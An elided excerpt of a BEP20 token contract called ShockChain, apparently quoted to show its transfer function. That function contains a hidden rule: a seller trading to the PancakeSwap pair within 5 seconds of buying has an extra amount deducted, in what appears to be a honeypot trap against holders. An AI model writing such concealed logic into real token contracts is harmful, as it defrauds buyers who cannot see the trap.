...
contract ShockChain is Ownable, IBEP20 {
    
    string private _name = "ShockChain";
    string private _symbol = "SHOC";
     ...
     function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_excluded[sender] || _excluded[recipient]) {
            ...
            if (sender != _pancakeAddress && recipient == _pancakePairAddress) {
                ...
                if (block.timestamp - lastBuy[sender] < 5 seconds) {
                    _balances[sender] = _balances[sender] - amount;
            ...
            if (sender == _pancakePairAddress) lastBuy[recipient] = block.timestamp;
            _balances[sender] = _balances[sender] - amount;
